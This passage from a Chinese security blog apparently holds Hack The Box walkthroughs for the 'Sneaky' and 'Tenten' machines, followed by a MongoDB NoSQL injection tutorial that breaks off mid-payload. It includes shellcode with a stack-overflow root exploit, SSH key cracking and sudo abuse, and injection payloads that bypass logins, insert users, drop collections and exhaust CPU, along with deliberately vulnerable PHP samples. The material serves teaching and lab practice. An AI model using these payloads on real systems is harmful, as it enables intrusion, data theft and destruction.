除此之外，还可以使用靶机作者写的一个Python脚本得到靶机的IPv6地址，传送门🚪 注意，要把/etc/snmp/snmp.conf文件改回来，不然会运行报错 123456789101112131415161718192021222324252627$ nmap -sV -A -6 dead:beef::0250:56ff:feaa:0b69Starting Nmap 7.50 ( https:&#x2F;&#x2F;nmap.org ) at 2017-07-30 22:11 ISTNmap scan report for dead:beef::250:56ff:feaa:b69Host is up (0.14s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 5d:5d:2a:97:85:a1:20:e2:26:e4:13:54:58:d6:a4:22 (DSA)| 2048 a2:00:0e:99:0f:d3:ed:b0:19:d4:6b:a8:b1:93:d9:87 (RSA)| 256 e3:29:c4:cb:87:98:df:99:6f:36:9f:31:50:e3:b9:42 (ECDSA)|_ 256 e6:85:a8:f8:62:67:f7:01:28:a1:aa:00:b5:60:f2:21 (EdDSA)80&#x2F;tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)|_http-title: 400 Bad RequestService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelHost script results:| address-info: | IPv6 EUI-64: | MAC address: | address: 00:50:56:aa:0b:69|_ manuf: VMwareService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 35.18 seconds 再用之前得到的SSH key登录靶机，拿到user.txt： 1234567891011121314151617181920212223λ ssh -6 -i sneaky.key thrasivoulos@dead:beef::0250:56ff:feb9:2771The authenticity of host &#39;dead:beef::250:56ff:feb9:2771 (dead:beef::250:56ff:feb9:2771)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq&#x2F;E2o.Are you sure you want to continue connecting (yes&#x2F;no)? yesWarning: Permanently added &#39;dead:beef::250:56ff:feb9:2771&#39; (ECDSA) to the list of known hosts.Welcome to Ubuntu 14.04.5 LTS (GNU&#x2F;Linux 4.4.0-75-generic i686) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com&#x2F; System information as of Fri Mar 20 08:31:46 EET 2020 System load: 0.0 Processes: 160 Usage of &#x2F;: 9.9% of 18.58GB Users logged in: 0 Memory usage: 10% IP address for eth0: 10.10.10.20 Swap usage: 0% Graph this data and manage this system at: https:&#x2F;&#x2F;landscape.canonical.com&#x2F;Your Hardware Enablement Stack (HWE) is supported until April 2019.Last login: Fri Mar 20 08:31:47 2020 from dead:beef:4::1057thrasivoulos@Sneaky:~$ lsuser.txt 检查suid文件 12345678910111213141516171819202122thrasivoulos@Sneaky:~$ find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \\; 2&gt;&#x2F;dev&#x2F;null;-rwsr-xr-x 1 root root 67704 Nov 24 2016 &#x2F;bin&#x2F;umount-rwsr-xr-x 1 root root 35300 May 4 2017 &#x2F;bin&#x2F;su-rwsr-xr-x 1 root root 88752 Nov 24 2016 &#x2F;bin&#x2F;mount-rwsr-xr-x 1 root root 43316 May 8 2014 &#x2F;bin&#x2F;ping6-rwsr-xr-x 1 root root 30112 May 15 2015 &#x2F;bin&#x2F;fusermount-rwsr-xr-x 1 root root 38932 May 8 2014 &#x2F;bin&#x2F;ping-rwsrwsr-x 1 root root 7301 May 4 2017 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal-rwsr-xr-- 1 root dip 323000 Apr 21 2015 &#x2F;usr&#x2F;sbin&#x2F;pppd-rwsr-xr-x 1 root root 18168 Nov 24 2015 &#x2F;usr&#x2F;bin&#x2F;pkexec-rwsr-xr-x 1 root root 18136 May 8 2014 &#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils-rwsr-xr-x 1 root root 35916 May 4 2017 &#x2F;usr&#x2F;bin&#x2F;chsh-rwsr-xr-x 1 root root 66284 May 4 2017 &#x2F;usr&#x2F;bin&#x2F;gpasswd-rwsr-xr-x 1 root root 45420 May 4 2017 &#x2F;usr&#x2F;bin&#x2F;passwd-rwsr-xr-x 1 root root 72860 Oct 21 2013 &#x2F;usr&#x2F;bin&#x2F;mtr-rwsr-xr-x 1 root root 30984 May 4 2017 &#x2F;usr&#x2F;bin&#x2F;newgrp-rwsr-xr-x 1 root root 156708 Oct 14 2016 &#x2F;usr&#x2F;bin&#x2F;sudo-rwsr-xr-x 1 root root 44620 May 4 2017 &#x2F;usr&#x2F;bin&#x2F;chfn-rwsr-xr-- 1 root messagebus 333952 Dec 7 2016 &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper-rwsr-xr-x 1 root root 492972 Aug 11 2016 &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign-rwsr-xr-x 1 root root 9808 Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1-rwsr-xr-x 1 root root 5480 Mar 27 2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device 命令解释： -perm -4000 列出拥有setuid属性的文件和目录 -user root 文件或目录所有者属于root -exec ls -ld {} \\ 对之前列出的文件目录再执行ls -ld命令 2&gt;/dev/null 将标准错误输出stderr删掉 查看/usr/local/bin/chal文件 12thrasivoulos@Sneaky:~$ file &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal&#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.24, BuildID[sha1]&#x3D;fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped 好了，从这里开始就到了我的知识盲区了，涉及到栈溢出漏洞的利用，只能跟着大佬一步一步的来。 Shellcode：http://shell-storm.org/shellcode/files/shellcode-811.php 1\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80 12345thrasivoulos@Sneaky:&#x2F;usr&#x2F;local&#x2F;bin$ .&#x2F;chal $(python -c &#39;print &quot;\\x90&quot;*330 +&quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80&quot; + &quot;\\x42\\xf4\\xff\\xbf&quot;*30&#39;)# iduid&#x3D;1000(thrasivoulos) gid&#x3D;1000(thrasivoulos) euid&#x3D;0(root) egid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)# cat &#x2F;root&#x2F;root.txtc515[----------------------------]fb33 0x05 Summary Sneaky是一个2017年的靶机，评分5分，不得不说质量非常高。扫描常规的TCP端口和网站路径后，用基本的SQL注入拿到用户名和SSH key，但是现在遇到了没有开放22端口的问题，紧接着去扫描UDP端口，发现运行了SNMP服务，我们可以使用snmpwalk工具通过GETNEXT请求查询指定OID入口的所有OID树信息，由此获得了靶机了IPv6的地址，nmap扫描后发现开放了SSH 22端口。但是提权root用到了栈溢出的知识点，确实没什么基础，看起来有点吃力，先mark，下次有时间再研究一下。 0x06 Reference https://www.youtube.com/watch?v=1UGxjqTnuyo&amp;feature=youtu.be https://s1gh.sh/hackthebox-sneaky-walkthrough/ https://hkh4cks.com/blog/2017/12/30/htb-sneaky-walkthrough/ https://www.hackingarticles.in/hack-the-box-challenge-sneaky-walkthrough/","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Tenten Walkthrough","date":"2020-03-18T15:57:20.000Z","path":"Target_drone/HackTheBox/6.HTB-Tenten-walkthrough/","text":"HTB::Tenten Walkthrough 0x01 Information 0x02 Tools and Tis nmap wpscan JohnTheRipper steghide wordpress job-manager plugin 0x03 Pentesting nmap扫描靶机端口： 1234567891011121314151617181920212223242526Nmap scan report for 10.10.10.10Host is up (0.23s latency).Not shown: 65533 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)| 256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)|_ 256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-generator: WordPress 4.7.3|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Job Portal &amp;#8211; Just another WordPress siteWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 4.8 (92%), Linux 4.9 (91%), Linux 3.12 (90%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelTRACEROUTE (using port 80&#x2F;tcp)HOP RTT ADDRESS1 237.00 ms 10.10.16.12 309.00 ms 10.10.10.10OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 541.37 seconds 一看80端口运行wordpress站点，不多BB，直接上wpscan工具扫描： wpscan使用教程：https://www.cnblogs.com/Xy--1/p/12236684.html 看到这个版本有很多XSS漏洞利用，但是打这个靶机XSS漏洞一般都是没什么作用，接着往下看，发现站点安装了一个job-manager的插件。 点击进入申请职位的页面，发现有一个文件上传的地方，先上传一个正常图片，再到http://10.10.10.10/wp-content/%year%/%month%/%filename%查看发现可以正常显示。再尝试用BurpSuite改一下文件内容： 服务端检测了后缀名，目前已知只能上传jpg，png等图片类型。 https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/ 这篇文章提到了一种类似平行越权的手法：http://10.10.10.10/index.php/jobs/apply/8/，这里8类似招聘文章的id，我们可以使用BurpSuite遍历它： 另外，这里扩展一种思路，可以直接写bash脚本跑出来，这种结果更为直观： 1for i in $(seq 1 20); do echo -n &quot;$i: &quot;; curl -s http://10.10.10.10/index.php/jobs/apply/$i | grep &#x27;&lt;title&gt;&#x27;; done id=13的这篇文章标题是HackerAccessGranted，比较可疑，另外id=17的文章标题是我刚刚上传的图片的文件名。这两点结合起来，我们怀疑HackerAccessGranted是不是也是用户上传的一张图片的文件名。但是要访问到这张图片，我们必须知道上传的年份和月份，想到这里，那就写一个Python脚本跑一下： 123456789101112131415import requestswebsite = &#x27;http://10.10.10.10/wp-content/uploads/&#x27;filename = &#x27;HackerAccessGranted&#x27;exts = [&#x27;jpg&#x27;, &#x27;png&#x27;, &#x27;gif&#x27;]for year in range(2016, 2018): for month in range(1, 13): for ext in exts: url = website + str(year) + &#x27;/&#x27; + &quot;&#123;:02&#125;&quot;.format(month) + &#x27;/&#x27; + filename + &#x27;.&#x27; + ext req = requests.get(url) if req.status_code == 404: url = website else: print(&#x27;[+] URL Found: &#x27; + url) 得到结果http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg 把图片用binwalk检查一下： 12345$ binwalk HackerAccessGranted.jpg DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.01 再用隐写工具steghide提取一下： 123$ steghide extract -sf HackerAccessGranted.jpg Enter passphrase: wrote extracted data to &quot;id_rsa&quot;. OK，提取出了id_rsa文件，再用John一把梭 1234567891011121314$ python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa.hash $ &#x2F;sbin&#x2F;john id_rsa.hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) 32&#x2F;64])Cost 1 (KDF&#x2F;cipher [0&#x3D;MD5&#x2F;AES 1&#x3D;MD5&#x2F;3DES 2&#x3D;Bcrypt&#x2F;AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 4 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press &#39;q&#39; or Ctrl-C to abort, almost any other key for statussuperpassword (id_rsa)Warning: Only 2 candidates left, minimum 4 needed for performance.1g 0:00:00:08 DONE (2020-03-18 10:52) 0.1173g&#x2F;s 1683Kp&#x2F;s 1683Kc&#x2F;s 1683KC&#x2F;sa6_123..*7¡Vamos!Session completed 好了，得到了密码，但是现在好像还没有用户名orz…，再用wpscan枚举站点的用户名 12345678910[i] User(s) Identified:[+] takis | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http:&#x2F;&#x2F;10.10.10.10&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) 再用ssh登录靶机，获取user.txt 123456789101112131415161718192021222324252627282930$ ssh -i id_rsa takis@10.10.10.10Enter passphrase for key &#39;id_rsa&#39;: Welcome to Ubuntu 16.04.2 LTS (GNU&#x2F;Linux 4.4.0-62-generic x86_64) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com * Management: https:&#x2F;&#x2F;landscape.canonical.com * Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage65 packages can be updated.39 updates are security updates.Last login: Fri May 5 23:05:36 2017takis@tenten:~$ whoamitakistakis@tenten:~$ ls -la &#x2F;home&#x2F;takistotal 48drwx------ 5 takis takis 4096 Apr 12 2017 .drwxr-xr-x 5 root root 4096 Apr 12 2017 ..-rw------- 1 root root 1 Dec 24 2017 .bash_history-rw-r--r-- 1 takis takis 220 Apr 12 2017 .bash_logout-rw-r--r-- 1 takis takis 3771 Apr 12 2017 .bashrcdrwx------ 2 takis takis 4096 Apr 12 2017 .cache-rw------- 1 root root 162 Apr 12 2017 .mysql_historydrwxrwxr-x 2 takis takis 4096 Apr 12 2017 .nano-rw-r--r-- 1 takis takis 655 Apr 12 2017 .profiledrwx------ 2 takis takis 4096 Apr 12 2017 .ssh-rw-r--r-- 1 takis takis 0 Apr 12 2017 .sudo_as_admin_successful-r--r--r-- 1 takis takis 33 Apr 12 2017 user.txt-rw-r--r-- 1 root root 217 Apr 12 2017 .wget-hsts 提权就很简单了 1234567891011121314takis@tenten:~$ sudo -lMatching Defaults entries for takis on tenten: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser takis may run the following commands on tenten: (ALL : ALL) ALL (ALL) NOPASSWD: &#x2F;bin&#x2F;fuckintakis@tenten:~$ ls -la &#x2F;bin&#x2F;fuckin-rwxr-xr-x 1 root root 24 Apr 12 2017 &#x2F;bin&#x2F;fuckintakis@tenten:~$ cat &#x2F;bin&#x2F;fuckin#!&#x2F;bin&#x2F;bash$1 $2 $3 $4takis@tenten:~$ sudo &#x2F;bin&#x2F;fuckin cat &#x2F;root&#x2F;root.txtf9f7[------------------]f603 0x04 Summary Tenten算是一个比较古老的Linux靶机了，就权当开阔知识面，这个靶机的风格和CTF的比赛题很像，通过找wordpress站点的插件漏洞，以及常见的wordpress上传路径来找到隐写id_rsa文件的图片。之后的过程就是比较简单的提权操作了，方法有很多。这个靶机算是比较简单的吧，写了一个小脚本来爆破目录，一天搞定，明天继续。","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"NoSQL注入之MongoDB","date":"2020-03-17T15:54:20.000Z","path":"Web_security/basic_learning/21.NoSQL注入之MongoDB/","text":"文章首发于 信安之路 公众号 NoSQL注入之MongoDB 0x01 NoSQL和MongoDB NoSQL NoSQL的概念就不赘述了，以下摘自菜鸟教程。 NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。 MongoDB 详细概念建议直接看教程 传送门🚪，这里就简单的总结几句。 在MySQL中，我们所熟知的几个最常见的概念是数据库(Database)、表(Table)、字段(Column)、记录(Record)、索引(Index)，这些术语映射到MongoDB中大概等价于数据库(Database)、集合(Collection)、域(Field)、文档(Document)、索引(Index)。下面就通过官网文档的几张图略作解释。 文档是由一组键值(key-value)对(即 BSON，Binary JSON)组成。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，例如： 集合就是 MongoDB 文档组，集合存在于数据库中，集合没有固定的结构，这意味着你对集合可以插入不同格式和类型的数据，但通常情况下我们插入集合的数据都会有一定的关联性。下面这张图展示了这三者之间的关系： 好了，前置知识部分介绍到这里，下面开始今天的正文部分：MongoDB注入 0x02 NoSQL注入 讲MangoDB注入之前，我们先大致了解一下整个NoSQL注入的流程，下面这张图来自OWASP： NoSQL提供了新的数据模型和查询格式，从而可以规避常规的SQL注入攻。但是，它们也为攻击者提供了插入恶意代码的新方法。总的来讲有四种注入手法： 重言式 又称为永真式（这个好像是数理逻辑里面的术语），此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。 联合查询 联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。 JavaScript注入 MongoDB Server支持JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，导致非法的数据获取或篡改。 盲注 当页面没有回显时，那么我们可以通过$regex正则表达式来达到和SQL注入中substr()函数相同的功能，而且NoSQL用到的基本上都是布尔盲注。 0x03 PHP MongoDB注入 在PHP中使用MongoDB你必须使用 MongoDB 的 PHP驱动，官网上可以看到有很多版本，其中1.0.0版本之后，php_mongodb.dll将不再支持MongoClient类，也就是说，$m = new MongoClient(&quot;mongodb://localhost:27017&quot;);这种调用方式已经被淘汰，而是用命名空间的方式，但是注入的手法和原理是差不多的，这里就主要介绍一下新版PHP驱动进行查询操作MongoDB的三种方法（一般注入也是发生在查询语句中），为了方便，均以GET请求方式为例。 测试环境 win10 PHP 7.3.4 MongoDB Server 4.2 php_mongodb.dll 1.7.4 重言式注入 利用executeQuery直接查询： 123456789101112131415161718192021222324252627&lt;?php# 连接数据库$manager = new MongoDB\\Driver\\Manager(&quot;mongodb://localhost:27017&quot;);$uname = $_GET[&#x27;username&#x27;];$pwd = $_GET[&#x27;password&#x27;];# 查询语句$query = new MongoDB\\Driver\\Query(array( &#x27;uname&#x27; =&gt; $uname, &#x27;pwd&#x27; =&gt; $pwd));# 执行语句$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();$count = count($result);if ($count &gt; 0) &#123; foreach ($result as $user) &#123; $user = ((array)$user); echo &#x27;username:&#x27; . $user[&#x27;uname&#x27;] . &#x27;&lt;br&gt;&#x27;; echo &#x27;password:&#x27; . $user[&#x27;pwd&#x27;] . &#x27;&lt;br&gt;&#x27;; &#125;&#125;else&#123; echo &#x27;Not Found&#x27;;&#125; 传递的参数是一个数组，比较安全。这种形式叫 ODM，它会帮你过滤数据，所以一般不用担心原语句被破坏。 ORM 对应关系型数据库，如 MySQL；ODM 对应文档型数据库，如 MongoDB。 当我们用公共用户ca01h输入时，显示出username和password： 这是一个正常的输入，数据处理过程如下图所示： PHP允许最终用户通过将URL参数更改为带有方括号的参数来将GET查询字符串输入更改为数组，我们试一下这种输入： $ne即not equal不等于 amazing~所有用户都查出来了，再看一下数据处理过程： 对于PHP本身的特性而言，由于其松散的数组特性，导致如果我们输入value=1那么，也就是输入了一个value的值为1的数据。如果输入value[$ne]=1也就意味着value=array($ne=&gt;1),在MongoDB中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用username[$gt]=&amp;password[$gt]=作为payload进行攻击。 这种方式也是我们通常用来验证网站是否存在NoSQL注入的第一步。 联合查询注入 我们都知道在SQL时代拼接字符串容易造成SQL注入，NoSQL也有类似问题，但是现在无论是PHP的MongoDB driver还是node.js的mongoose都必须要求查询条件必须是一个数组或者query对象了，因此简单看一下就好。 示例代码： 1string query =&quot;&#123; username: &#x27;&quot; + $username + &quot;&#x27;, password: &#x27;&quot; + $password + &quot;&#x27; &#125;&quot; Payload： 1username&#x3D;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;: &#39;a&amp;password&#x3D;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39; 相当于执行了： 1&#123; username: &#39;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;:&#39;a&#39;, password: &#39;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39; 这种手法和SQL注入比较相似： 1select * from logins where username &#x3D; &#39;admin&#39; and (password true&lt;&gt; or (&#39;a&#39;&#x3D;&#39;a&#39; and password &#x3D; &#39;&#39;)) JavaScript注入 $where操作符 在MongoDB中 $where操作符是可以执行JavaScript语句的，在MongoDB 2.4之前，通过$where操作符使用map-reduce、group命令可以访问到mongo shell中的全局函数和属性。 123456789101112131415161718192021222324&lt;?php$manager = new MongoDB\\Driver\\Manager();$uname = $_GET[&#x27;username&#x27;];$pwd = $_GET[&#x27;password&#x27;];$function = &quot;function() &#123;if(this.uname == &#x27;$uname&#x27; &amp;&amp; this.pwd == &#x27;$pwd&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;;$query = new MongoDB\\Driver\\Query(array( &#x27;$where&#x27; =&gt; $function));$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();$count = count($result);if ($count&gt;0) &#123; foreach ($result as $user) &#123; $user=(array)$user; echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;&lt;br&gt;&quot;; echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;&lt;br&gt;&quot;; &#125;&#125;else&#123; echo &#x27;Not Found&#x27;;&#125; MongoDB 2.4版本之前，可以访问到db属性： 1?username&#x3D;&#39;||1) return &#123;&#39;username&#39;: tojson(db.getCollectionNames()), &#39;password&#39;: &#39;hacked&#39;&#125;&#125;&#x2F;&#x2F;&amp;password&#x3D;1 由此可以扩展出其他的很多类似的payload。 MongoDB 2.4版本之后，无法访问全局属性，NoSQL中的万能密码payload(单引号闭合)： 1?username&#x3D;1&amp;password&#x3D;admin&#39; || &#39;&#39; &#x3D; &#39; 相当于执行： 1$function &#x3D; &quot;function() &#123;if(this.uname &#x3D;&#x3D; &#39;anything&#39; &amp;&amp; this.pwd &#x3D;&#x3D; &#39;admin&#39; || &#39;&#39; &#x3D;&#x3D; &#39;&#39;) return &#123;&#39;username&#39;: this.uname, &#39;password&#39;: this.pwd&#125;&#125;&quot;; 此外还有一个类似于DOS攻击的payload，可以让服务器CPU飙升到100%持续5秒： 1?username&#x3D;1&amp;password&#x3D;1;(function()&#123;var date &#x3D; new Date(); do&#123;curDate &#x3D; new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)(); eval 注意，eval使用方式在Mongo3.0之后已经被废弃了，而且在官方页面中也没有Mongo3.0版本之前的下载链接了，以下的实例代码未经测试，仅提供给大家一个思路，以下代码引用自https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html 123456789101112131415161718192021222324&lt;?php$manager = new MongoDB\\Driver\\Manager();$uname = $_GET[&#x27;username&#x27;];$pwd = $_GET[&#x27;password&#x27;];$cmd = new MongoDB\\Driver\\Command([&#x27;eval&#x27;=&gt; &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname&#x27;&#125;)&quot;]);echo &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname&#x27;&#125;)&quot;;$result = $manager-&gt;executeCommand(&#x27;sec_test&#x27;, $cmd)-&gt;toArray();$result =((array)$result[0])[&#x27;retval&#x27;];$count = count($result);if ($count&gt;0) &#123; foreach ($result as $user) &#123; $user=(array)$user; echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\\n&quot;; echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\\n&quot;; &#125;&#125;else&#123; echo &#x27;Not Found&#x27;;&#125;?&gt; 往users集合插入攻击者用户： 1?username&#x3D;1&#39;&#125;);db.users.insert(&#123;&quot;username&quot;:&quot;ca01h&quot;,&quot;password&quot;:&quot;1&quot;&#125;);db.users.find(&#123;&#39;username&#39;:&#39;2 删掉users集合： 1?username&#x3D;1&#39;&#125;);db.users.drop();db.users.find(&#123;&#39;username&#39;:&#39;2 mapReduce MongoDB中的mapReduce函数有点类似于MySQL中的group by操作，下面是一个官方文档的例子，在集合 orders 中查找 status:“A” 的数据，并根据 cust_id 来分组，并计算 amount 的总和： 简单的解释一下： map函数用于分组： 1function map()&#123; emit(param1, param2); &#125; param1：需要分组的字段，this.字段名； param2：需要进行统计的字段，this.字段名。 reduce函数用于处理需要统计的字段： 1function reduce(key, values)&#123; // 统计字段处理 &#125; key： 指分组字段（emit的param1）对应的值； values：指需要统计的字段（emit的param2）值组成的数组。 Map函数和Reduce函数可以使用 JavaScript 来实现，使得MapReduce的使用非常灵活和强大。但是同样也带来了隐患，假设有这样的一个业务场景，数据库中存储了一个store集合，有一系列商品的名称、价格和数量，我们想得到相同商品的价格或者数量的总和，代码如下： 123456789101112require_once __DIR__ &quot;/vendor/autoload.php&quot;;$param = $_POST[&#x27;param&#x27;];$collection = (new MongoDB\\Client)-&gt;test-&gt;stores;$map = &quot;function() &#123; for (var i = 0; i &lt; this.items.length; i++) &#123; emit(this.name, this.items[i].$param); &#125; &#125;&quot;;$reduce = &quot;function(name, sum) &#123; return Array.sum(sum); &#125;&quot;;$opt = &quot;&#123; out: &#x27;totals&#x27; &#125;&quot;;$results = $collection-&gt;mapReduce($map, $reduce, $out); 该代码应该在$param给定的字段上求和，但是这同样给了攻击者可乘之机，如果$param是这样： 123a);&#125;&#125;,function(kv) &#123; return 1; &#125;, &#123; out: ‘x’ &#125;);db.injection.insert(&#123;success:1&#125;); return 1;db.stores.mapReduce(function() &#123; &#123; emit(1,1 那么在MongoDB中就相当于执行了下面这条语句： 12345678910db.stores.mapReduce(function() &#123; for (var i&#x3D;0; i &lt; this.items.length; i++) &#123;emit(this.name, this.items[i].a);&#125;&#125;,function(kv) &#123; return 1; &#125;, &#123; out: &#39;x&#39; &#125;);db.injection.insert(&#123;success:1&#125;); return 1;db.stores.mapReduce(function() &#123; &#123; emit(1,1); &#125; &#125;,function(name, sum) &#123;return Array.sum(sum); &#125;, &#123; out: &#39;totals&#39; &#125;);&quot; 相当于直接控制了整个MongoDB的操作。 但我们也同时发现，构建这样的payload是有一定难度的，需要我们对MongoDB，JavaScript和业务都有足够的了解，这也是NoSQL注入的局限性。但是，这个例子也告诉我们有用户输入的地方就有危险存在，比如后面有一个CTF题，用的也是MongoDB中的聚合函数aggregate，但是因为一个GET参数而存在注入漏洞。 盲注 回想一想上面的例子，假如页面只是告诉你成功或者失败，那么就是我们在 MySQL 里遇到的布尔盲注了。布尔盲注重点在于怎么逐个提取字符，MySQL 里我们可以采用substr，而在 MongoDB 里我们有 $regex。 已知某一个用户名的前提下判断的密码长度： 1?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;.&#123;5&#125; 逐位提取字符： 123456789101112# url格式?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;c.&#123;4&#125;?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca.&#123;3&#125;?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca0.&#123;2&#125;?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;c.*?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca.*# json格式&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^c&quot; &#125;&#125;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: 